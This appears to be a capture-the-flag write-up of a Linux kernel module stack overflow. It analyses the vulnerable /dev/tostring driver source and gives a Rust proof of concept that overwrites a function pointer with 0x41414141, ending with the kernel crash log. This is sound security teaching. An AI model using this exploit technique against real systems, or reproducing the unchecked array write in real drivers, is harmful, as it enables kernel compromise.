<!DOCTYPE html>
<html lang="en">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  
    <title>Pwn: Linux Kernel x86 - Basic Buffer Overflow :: yocvito website</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="A simple linux kernel stack overflow challenge where we override a function pointer" />
<meta name="keywords" content="write-up, pwn, linux-kernel, x86" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="//localhost:1313/posts/pwn-linkern-stack/" />





  
  <link rel="stylesheet" href="//localhost:1313/css/style.min.1cdbb7cf76923868c5b397f2052baabd091aedcc09ffebdd5da68e6d56712689.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/buttons.min.2bc533403a27dfe0e93105a92502b42ce4587e2e4a87d9f7d349e51e16e09478.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/code.min.00125962708925857e7b66dbc58391d55be1191a3d0ce2034de8c9cd2c481c36.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/fonts.min.4881f0c525f3ce2a1864fb6e96676396cebe1e6fcef1933e8e1dde7041004fb5.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/footer.min.2e3eb191baee58dd05a9f0104ac1fab0827bca7c64dafe0b2579f934c33a1d69.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/header.min.b6fb4423cf82a9f9d7abc9cd010223fa3d70a6526a3f28f8e17d814c06e18f9e.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/main.min.fe8dc560fccb53a458b0db19ccb7b265764ac46b68596b7e099c6793054dd457.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/menu.min.83637a90d903026bc280d3f82f96ceb06c5fc72b7c1a8d686afb5bbf818a29f7.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/pagination.min.82f6400eae7c7c6dc3c866733c2ec0579e4089608fea69400ff85b3880aa0d3c.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/post.min.fc74ca360273c1d828da3c02b8174eba435607b369d98418ccc6f2243cd4e75d.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/prism.min.9023bbc24533d09e97a51a0a42a5a7bfe4c591ae167c5551fb1d2191d11977c0.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/syntax.min.cc789ed9377260d7949ea4c18781fc58959a89287210fe4edbff44ebfc1511b6.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/terminal.min.dc41063add420c2d2107bf5328b2f5abe23fb57e24dbc4fa9e7827b9f5bd8f9a.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">







<link rel="shortcut icon" href="//localhost:1313/favicon.png">
<link rel="apple-touch-icon" href="//localhost:1313/apple-touch-icon.png">


<meta name="twitter:card" content="summary" />

  
    <meta name="twitter:site" content="" />
  
    <meta name="twitter:creator" content="" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Pwn: Linux Kernel x86 - Basic Buffer Overflow">
<meta property="og:description" content="A simple linux kernel stack overflow challenge where we override a function pointer" />
<meta property="og:url" content="//localhost:1313/posts/pwn-linkern-stack/" />
<meta property="og:site_name" content="yocvito website" />

  
  
  <meta property="og:image" content="//localhost:1313/">

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">


  <meta property="article:published_time" content="2025-01-28 12:00:00 &#43;0100 CET" />












</head>
<body>


<div class="container">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    yocvito
  </div>
</a>

    </div>
    
      <ul class="menu menu--mobile">
  <li class="menu__trigger">Menu&nbsp;â–¾</li>
  <li>
    <ul class="menu__dropdown">
      
        
          <li><a href="/about/about">About</a></li>
        
      
        
          <li><a href="/posts">Blog</a></li>
        
      
        
          <li><a href="/projects">Projects</a></li>
        
      
        
          <li><a href="/about/resume">Resume / CV</a></li>
        
      
      
    </ul>
  </li>
</ul>

    
    
  </div>
  
    <nav class="navigation-menu">
  <ul class="navigation-menu__inner menu--desktop">
    
      
        
          <li><a href="/about/about" >About</a></li>
        
      
        
          <li><a href="/posts" >Blog</a></li>
        
      
        
          <li><a href="/projects" >Projects</a></li>
        
      
        
          <li><a href="/about/resume" >Resume / CV</a></li>
        
      
      
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="//localhost:1313/posts/pwn-linkern-stack/">Pwn: Linux Kernel x86 - Basic Buffer Overflow</a>
  </h1>
  <div class="post-meta"><time class="post-date">2025-01-28</time><span class="post-author">yocvito</span></div>

  
    <span class="post-tags">
      
      #<a href="//localhost:1313/tags/write-up/">write-up</a>&nbsp;
      
      #<a href="//localhost:1313/tags/pwn/">pwn</a>&nbsp;
      
      #<a href="//localhost:1313/tags/linux-kernel/">linux-kernel</a>&nbsp;
      
      #<a href="//localhost:1313/tags/x86/">x86</a>&nbsp;
      
    </span>
  
  


  

  <div class="post-content"><div>
        <h1 id="pwn-linkern-x86---basic-buffer-overflow">PWN: LinKern x86 - Basic Buffer Overflow<a href="#pwn-linkern-x86---basic-buffer-overflow" class="hanchor" ariaLabel="Anchor">#</a> </h1>
<p>We are tasked with exploiting an LKM that performs int to string conversions.</p>
<p>We have access to the source code of the LKM, simplifying the analysis.</p>
<h2 id="source-code-analysis">Source code analysis<a href="#source-code-analysis" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<h3 id="lkm-initialization">LKM initialization<a href="#lkm-initialization" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>We first search for the functions tagged with <code>__init</code> and <code>__exit</code> maccros, which are later passed to the <code>module_init</code> and <code>module_exit</code> maccros and defines the LKM entry and exit points (called when loading/unloading the kernel module). These are the functions responsible for setting up/cleaning up the LKM interactions with the kernel (set up hooks, char devices, &hellip;)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> __init <span style="color:#a6e22e">tostring_init</span>(<span style="color:#66d9ef">void</span>) <span style="color:#75715e">/* Constructor */</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printk</span>(KERN_INFO <span style="color:#e6db74">&#34;Tostring registered&#34;</span>);
</span></span><span style="display:flex;"><span>  tostring.pointer<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  tostring.tostring_read<span style="color:#f92672">=</span> tostring_read_hexa;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">alloc_chrdev_region</span>(<span style="color:#f92672">&amp;</span>first, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;tostring&#34;</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((cl <span style="color:#f92672">=</span> <span style="color:#a6e22e">class_create</span>(THIS_MODULE, <span style="color:#e6db74">&#34;chardrv&#34;</span>)) <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">unregister_chrdev_region</span>(first, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">device_create</span>(cl, NULL, first, NULL, <span style="color:#e6db74">&#34;tostring&#34;</span>) <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printk</span>(KERN_INFO <span style="color:#e6db74">&#34;Tostring error&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">class_destroy</span>(cl);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">unregister_chrdev_region</span>(first, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">cdev_init</span>(<span style="color:#f92672">&amp;</span>c_dev, <span style="color:#f92672">&amp;</span>pugs_fops);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">cdev_add</span>(<span style="color:#f92672">&amp;</span>c_dev, first, <span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">device_destroy</span>(cl, first);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">class_destroy</span>(cl);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">unregister_chrdev_region</span>(first, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printk</span>(KERN_INFO <span style="color:#e6db74">&#34;&lt;Major, Minor&gt;: &lt;%d, %d&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">MAJOR</span>(first), <span style="color:#a6e22e">MINOR</span>(first));
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> __exit <span style="color:#a6e22e">tostring_exit</span>(<span style="color:#66d9ef">void</span>) <span style="color:#75715e">/* Destructor */</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">unregister_chrdev_region</span>(first, <span style="color:#ae81ff">3</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printk</span>(KERN_INFO <span style="color:#e6db74">&#34;Tostring unregistered&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module_init</span>(tostring_init);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module_exit</span>(tostring_exit);
</span></span></code></pre></div><p>As we can see, the init function allocates a character device at <code>/dev/tostring</code> (with the <code>device_create</code> function).</p>
<!-- raw HTML omitted -->
<p>It initialize it&rsquo;s <code>file_operations</code> struct (responsible for defining the API of the character device) to the following content:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">struct</span> file_operations pugs_fops <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  .owner <span style="color:#f92672">=</span> THIS_MODULE,
</span></span><span style="display:flex;"><span>  .open <span style="color:#f92672">=</span> tostring_open,
</span></span><span style="display:flex;"><span>  .release <span style="color:#f92672">=</span> tostring_close,
</span></span><span style="display:flex;"><span>  .read <span style="color:#f92672">=</span> tostring_read,
</span></span><span style="display:flex;"><span>  .write <span style="color:#f92672">=</span> tostring_write
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p>This means that using <code>open/close/read/write</code> syscalls on the <code>/dev/tostring</code> character device will make the kernel call the fops struct functions. Here is the entry point for the LKM.</p>
<p>Thus we know that if a bug resides in the LKM, it is likely to be triggered by this interface (more complex LKMs would eventually require to interact with other kernel components in order to exploit)</p>
<h3 id="char-device-interface-analysis">Char device interface analysis<a href="#char-device-interface-analysis" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>The <code>tostring_open</code> and <code> tostring_close</code> functions are dummy functions that only prints a message (it could initiliaze data structures or stuff related to the LKM logic). Here it is mostly to comply with the &ldquo;Everything is a file&rdquo; linux phylosophy, where userspace programs will open/close the file (our character device) before/after interacting with it using read/write.</p>
<p>Both read and write primitives internally uses the following C struct:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> tostring_s {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> pointer;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">int</span> tostring_stack[<span style="color:#ae81ff">64</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">ssize_t</span> (<span style="color:#f92672">*</span>tostring_read)(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>f, <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf, <span style="color:#66d9ef">size_t</span> len, <span style="color:#66d9ef">loff_t</span> <span style="color:#f92672">*</span>off); 
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p>It holds a memory area to store integers to convert (<code>tostring_stack</code>), an integer <code>pointer</code> to the internal struct stack memory, and a function pointer to the reading primitive function (<code>tostring_read</code>).</p>
<p><em>One could notice that storing data related to control flow alongside working data memory is not a good practice.</em></p>
<h4 id="writing-to-char-device">Writing to char device<a href="#writing-to-char-device" class="hanchor" ariaLabel="Anchor">#</a> </h4>
<p>The <code>tostring_write</code> function has a double logic based on the first character of the supplied buffer (argument <code>buf</code>). It can either modify the string reading logic of the LKM, or add data to the internal <code>tostring_s</code> struct.</p>
<p>It first copy data from userspace to kernel space (this is classical behavior to avoid using the userspace memory pointers directly)</p>
<p>Then it analyze the first character of the input buffer. If the first character is a <code>M</code> it analyze the second character. If it&rsquo;s a <code>H</code> it set the internal reading primitive to <code>tostring_read_hexa</code>, and set it to <code>tostring_read_dec</code> if second char is a <code>D</code>.</p>
<p>Otherwise, it copies the first bytes (8 bytes on a 64bits machine) of the buffer to the internal <code>tostring_s</code> stack memory without any checks on the maximal size of this field.</p>
<p><strong>This typically allows an attacker to overwrite data which are located just after the internal stack in memory</strong> <em>(here the <code>tostring_read</code> function pointer)</em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">ssize_t</span> <span style="color:#a6e22e">tostring_write</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>f, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf,<span style="color:#66d9ef">size_t</span> len, <span style="color:#66d9ef">loff_t</span> <span style="color:#f92672">*</span>off)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>bufk;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printk</span>(KERN_INFO <span style="color:#e6db74">&#34;Tostring: write()</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// rajout du 0 final
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  
</span></span><span style="display:flex;"><span>  bufk <span style="color:#f92672">=</span> <span style="color:#a6e22e">kmalloc</span>(len <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, GFP_DMA);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (bufk){
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">copy_from_user</span>(bufk, buf, len))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EFAULT;
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    bufk[len] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (bufk[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;M&#39;</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (bufk[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;H&#39;</span>) tostring.tostring_read<span style="color:#f92672">=</span> tostring_read_hexa;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (bufk[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;D&#39;</span>) tostring.tostring_read<span style="color:#f92672">=</span> tostring_read_dec;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printk</span>(<span style="color:#e6db74">&#34;tostring: insertion %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#f92672">*</span>((<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>) bufk));
</span></span><span style="display:flex;"><span>      tostring.tostring_stack[tostring.pointer<span style="color:#f92672">++</span>]<span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((<span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>) bufk);;      
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">kfree</span>(bufk);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> len;
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h4 id="reading-from-char-device">Reading from char device<a href="#reading-from-char-device" class="hanchor" ariaLabel="Anchor">#</a> </h4>
<p>On ther other hand, the reading function just calls the <code>tostring_read</code> function stored in the internal <code>tostring_s</code> struct, which should fill the input buffer with either a decimal or hexadecimal string representing the top integer value of <code>tostring_stack</code> (if not empty).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">ssize_t</span> <span style="color:#a6e22e">tostring_read</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>f, <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf, <span style="color:#66d9ef">size_t</span> len, <span style="color:#66d9ef">loff_t</span> <span style="color:#f92672">*</span>off)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printk</span>(KERN_INFO <span style="color:#e6db74">&#34;Tostring: read()</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>(tostring.tostring_read)(f, buf, len, off); 
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">ssize_t</span> <span style="color:#a6e22e">tostring_read_hexa</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>f, <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf, <span style="color:#66d9ef">size_t</span> len, <span style="color:#66d9ef">loff_t</span> <span style="color:#f92672">*</span>off)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printk</span>(KERN_INFO <span style="color:#e6db74">&#34;Tostring: read_hexa()</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (tostring.pointer <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>(<span style="color:#a6e22e">snprintf</span>(buf,len,<span style="color:#e6db74">&#34;%16llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,tostring.tostring_stack[<span style="color:#f92672">--</span>tostring.pointer]));
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">return</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">ssize_t</span> <span style="color:#a6e22e">tostring_read_dec</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>f, <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf, <span style="color:#66d9ef">size_t</span> len, <span style="color:#66d9ef">loff_t</span> <span style="color:#f92672">*</span>off)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printk</span>(KERN_INFO <span style="color:#e6db74">&#34;Tostring: read_dec()</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (tostring.pointer <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>(<span style="color:#a6e22e">snprintf</span>(buf,len,<span style="color:#e6db74">&#34;%lld</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,tostring.tostring_stack[<span style="color:#f92672">--</span>tostring.pointer]));
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">return</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>If we achieve to overwrite the <code>tostring_read</code> function pointer with the address of any other kernel function, we can achieve code execution from the LKM context (likely giving full privileges to the system).</p>
<h2 id="exploitation">Exploitation<a href="#exploitation" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<h3 id="verify-our-guess--exploit-skeletton">Verify our guess + exploit skeletton<a href="#verify-our-guess--exploit-skeletton" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>First, we will write a simple script that trigger the bug we found. The script will be adapted later to craft the exploit.</p>
<p>What we need to do is:</p>
<ol>
<li>Open <code>/dev/tostring</code></li>
<li>Fill the stack to make it full (by writing 32 bits integers)</li>
<li>Write the stack with our malicious pointer (should overflow the stack and overwrite <code>tostring_read</code>)</li>
<li>Performs a read to call the <code>tostring_read</code> function pointer, effectively diverting the control flow to our malicious function</li>
</ol>
<p>Here is a simple Rust code doing this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Rust" data-lang="Rust"><span style="display:flex;"><span><span style="color:#66d9ef">use</span> std::{fs::OpenOptions, io::{Read, Write}};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#66d9ef">TOSTRING_STACK_SIZE</span>: <span style="color:#66d9ef">usize</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">64</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>   
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> intval: <span style="color:#66d9ef">usize</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> tostring_read_override_ea: <span style="color:#66d9ef">usize</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x41414141</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#66d9ef">mut</span> dev <span style="color:#f92672">=</span> <span style="color:#66d9ef">match</span> OpenOptions::new()
</span></span><span style="display:flex;"><span>        .read(<span style="color:#66d9ef">true</span>)
</span></span><span style="display:flex;"><span>        .write(<span style="color:#66d9ef">true</span>)
</span></span><span style="display:flex;"><span>        .open(<span style="color:#e6db74">&#34;/dev/tostring&#34;</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        Ok(f) <span style="color:#f92672">=&gt;</span> f,
</span></span><span style="display:flex;"><span>        Err(e) <span style="color:#f92672">=&gt;</span> {
</span></span><span style="display:flex;"><span>            eprintln!(<span style="color:#e6db74">&#34;Failed to open /dev/tostring: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span>, e);
</span></span><span style="display:flex;"><span>            std::process::exit(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// grow stack
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">for</span> _ <span style="color:#66d9ef">in</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">..</span><span style="color:#66d9ef">TOSTRING_STACK_SIZE</span> {
</span></span><span style="display:flex;"><span>        dev.write_all(<span style="color:#f92672">&amp;</span>intval.to_le_bytes()).expect(<span style="color:#e6db74">&#34;Failed to write to /dev/tostring to override stack&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// overwrite `tostring_read`
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    dev.write_all(<span style="color:#f92672">&amp;</span>tostring_read_override_ea.to_le_bytes()).expect(<span style="color:#e6db74">&#34;Failed to write to /dev/tostring to override function pointer&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#66d9ef">mut</span> ret <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span><span style="color:#66d9ef">u8</span>; size_of::<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">usize</span><span style="color:#f92672">&gt;</span>()];
</span></span><span style="display:flex;"><span>    dev.read_exact(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> ret).expect(<span style="color:#e6db74">&#34;Failed to read from /dev/tostring&#34;</span>); <span style="color:#75715e">// &lt;-- should make kernel crash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    println!(<span style="color:#e6db74">&#34;result: </span><span style="color:#e6db74">{:#x}</span><span style="color:#e6db74">&#34;</span>, <span style="color:#66d9ef">usize</span>::from_le_bytes(ret));
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The target runs on a 32bits x86 processor, meaning we have to compile the binary for this target:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mkdir ch1_exploit <span style="color:#f92672">&amp;&amp;</span> cd ch1_exploit
</span></span><span style="display:flex;"><span>cargo init .
</span></span><span style="display:flex;"><span>vi src/main.rs <span style="color:#75715e"># paste code above and type :x! to exit</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># add the x86 static target</span>
</span></span><span style="display:flex;"><span>rustup target add i686-unknown-linux-musl
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># build the binary</span>
</span></span><span style="display:flex;"><span>cargo build --target i686-unknown-linux-musl
</span></span></code></pre></div><p>Then, uploading the binary to the target and running it gives us the following crash. We sucessfully triggered the bug ! (notice the <code>IP = 0x41414141</code> message indicating kernel tried to branch to the address we injected)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Root-Me user@linkern-chall:~$ ./exploit
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.010914<span style="color:#f92672">]</span> BUG: unable to handle kernel paging request at <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.019794<span style="color:#f92672">]</span> IP: 0x41414141
